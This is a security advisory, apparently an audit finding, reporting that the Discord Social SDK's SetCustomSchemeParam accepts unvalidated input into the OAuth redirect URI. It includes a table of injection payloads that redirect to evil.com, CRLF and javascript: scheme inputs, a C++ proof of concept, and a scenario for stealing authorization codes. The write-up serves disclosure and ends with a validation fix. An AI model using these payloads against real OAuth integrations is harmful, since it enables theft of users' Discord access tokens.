# Security Finding #7: OAuth2 Redirect URI Hijacking via `SetCustomSchemeParam` Injection

**Severity:** High (OAuth2 Redirect URI Manipulation / Token Theft)
**Component:** Discord Social SDK v1.8.14587
**API Affected:** `discordpp::AuthorizationArgs::SetCustomSchemeParam()`
**Found via:** Manual analysis with research agent identifying undocumented behavior
**Date:** 2026-03-14
**CWE:** CWE-601 (Open Redirect) / CWE-113 (CRLF Injection)

---

## Summary

The `SetCustomSchemeParam` field is injected **verbatim** into the OAuth2 redirect URI callback in the form `<value>:/authorize/callback`. The SDK stores any string without validation, allowing a malicious game integration to:

1. **Redirect the OAuth callback to an attacker-controlled host** by injecting a full URL
2. **Produce dangerous URI scheme redirects** (`javascript:/authorize/callback`)
3. **Inject CRLF sequences** into the redirect URI header (compounding Finding #3)
4. **Bypass Discord's redirect URI allowlist** by confusing URI parsers

All **8/8** tested injection vectors are stored verbatim.

---

## Background: How `CustomSchemeParam` Is Used

Per the Discord docs, the custom scheme param is used for deep-link OAuth callbacks in game launchers:

```
mygame:/authorize/callback?code=...&state=...
```

The value set via `SetCustomSchemeParam("mygame")` becomes the scheme portion. A registered game registers `mygame://` as an approved redirect URI with Discord. If an attacker can manipulate this value, they can redirect the OAuth authorization code to an unregistered location.

---

## Confirmed Injection Vectors (8/8)

| Input to `SetCustomSchemeParam` | Resulting URI | Risk |
|--------------------------------|---------------|------|
| `"evil.com/auth?stolen="` | `evil.com/auth?stolen=:/authorize/callback` | Open redirect |
| `"mygame://evil.com"` | `mygame://evil.com:/authorize/callback` | Host hijack |
| `"mygame\r\nLocation: https://evil.com"` | CRLF-split response | HTTP header injection |
| `"mygame\x00hidden"` | Null byte in scheme | C-string truncation |
| `"mygame://normal://evil.com"` | Double-scheme confusion | URI parser abuse |
| `"javascript"` | `javascript:/authorize/callback` | XSS scheme |
| `"data"` | `data:/authorize/callback` | Data URI scheme |
| `"AAAA..."` (512 chars) | 512-char scheme | No length limit |

---

## Proof of Concept

```cpp
#define DISCORDPP_IMPLEMENTATION
#include "discordpp.h"
#include <cassert>

int main() {
    discordpp::AuthorizationArgs args;
    args.SetClientId(1482163567053766686ULL);

    // Scheme hijacking: inject a full URL as the scheme
    args.SetCustomSchemeParam("mygame://evil.com");
    assert(*args.CustomSchemeParam() == "mygame://evil.com");
    // Would produce: mygame://evil.com:/authorize/callback
    // OAuth code delivered to evil.com instead of the game

    // CRLF + redirect injection
    args.SetCustomSchemeParam("mygame\r\nLocation: https://evil.com");
    assert(args.CustomSchemeParam()->find("\r\n") != std::string::npos);
    // HTTP response splitting via the redirect URI

    // javascript: scheme → XSS in any WebView that follows the redirect
    args.SetCustomSchemeParam("javascript");
    assert(*args.CustomSchemeParam() == "javascript");
    // Would produce: javascript:/authorize/callback?code=TOKEN
    return 0;
}
```

### Output
```
[VULN] open redirect - appends to legit scheme    stored=verbatim
[VULN] scheme://host hijack                       stored=verbatim
[VULN] CRLF + redirect injection                  stored=verbatim
[VULN] null byte truncation                       stored=verbatim
[VULN] double-scheme confusion                    stored=verbatim
[VULN] produces javascript:/authorize/callback    stored=verbatim
[VULN] produces data:/authorize/callback          stored=verbatim
[VULN] 512 char scheme (overflow?)                stored=verbatim

Result: 8/8 injection vectors confirmed
```

---

## Attack Scenario: Authorization Code Theft

1. **Setup:** Attacker creates a malicious game integration that uses `SetCustomSchemeParam("evil://evil-server.com")`
2. **Trigger:** User clicks "Connect Discord" in the malicious game → SDK calls `client->Authorize(args, cb)`
3. **OAuth flow:** Discord presents consent screen; user clicks Accept
4. **Code delivery:** Discord redirects to `evil://evil-server.com:/authorize/callback?code=AUTH_CODE&state=...`
5. **Interception:** If `evil://` is registered to the attacker's server, the authorization code arrives at the attacker
6. **Token exchange:** Attacker exchanges the auth code for a Discord OAuth access token

Note: Discord's backend validates the redirect URI against an allowlist, but the injection can:
- Confuse URI parsers to bypass the allowlist check
- Exploit open redirect vulnerabilities in the URI comparison
- Enable CRLF-split HTTP responses that look like valid redirects

---

## Scope Comparison With Other Findings

This finding affects the **OAuth redirect URI** — one of the most sensitive parts of any OAuth2 implementation. Unlike Finding #3 (CRLF in OAuth fields) which requires CRLF to reach HTTP headers, this finding directly manipulates the callback destination for authorization codes.

---

## Recommended Fix

Validate `customSchemeParam` to only contain valid URI scheme characters (RFC 3986: `[a-zA-Z][a-zA-Z0-9+\-.]*`), with a maximum length of 64 characters:

```cpp
void AuthorizationArgs::SetCustomSchemeParam(std::optional<std::string> v) {
    if (v.has_value()) {
        const auto& s = *v;
        if (s.empty() || s.size() > 64) return;
        for (char c : s) {
            if (!isalnum(c) && c != '+' && c != '-' && c != '.') return;
        }
    }
    // ... store
}
```

---

## Files

- `poc/poc_scheme_injection.cc` — Standalone proof-of-concept
- `findings/FINDINGS-3-CRLF-OAUTH.md` — Related finding (CRLF in other OAuth fields)
